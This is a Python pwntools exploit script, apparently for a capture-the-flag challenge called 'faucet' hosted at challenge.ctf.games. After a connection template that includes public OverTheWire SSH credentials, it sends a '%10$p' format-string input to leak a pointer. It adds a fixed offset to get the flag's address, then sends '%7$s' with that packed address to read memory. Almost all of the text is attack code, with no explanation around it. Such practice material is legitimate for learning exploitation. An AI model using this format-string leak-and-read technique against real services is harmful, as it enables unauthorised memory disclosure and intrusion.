from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './faucet'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('challenge.ctf.games',31150) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *buy_item')



##########################
##### OFFSET FINDER ######
##########################
P.sendlineafter(b'> ',b'5')
P.sendlineafter(b'buy?: ',b'%10$p')
P.recvuntil(b'bought a ')
leak = int(P.recvline().strip(),16)
print(hex(leak))
flag_add = leak +0x2e80
print(hex(flag_add))
P.sendlineafter(b'> ',b'5')
P.sendlineafter(b'buy?: ',b'%7$saaaa'+p64(flag_add))


P.interactive() #Interact with your shell :)
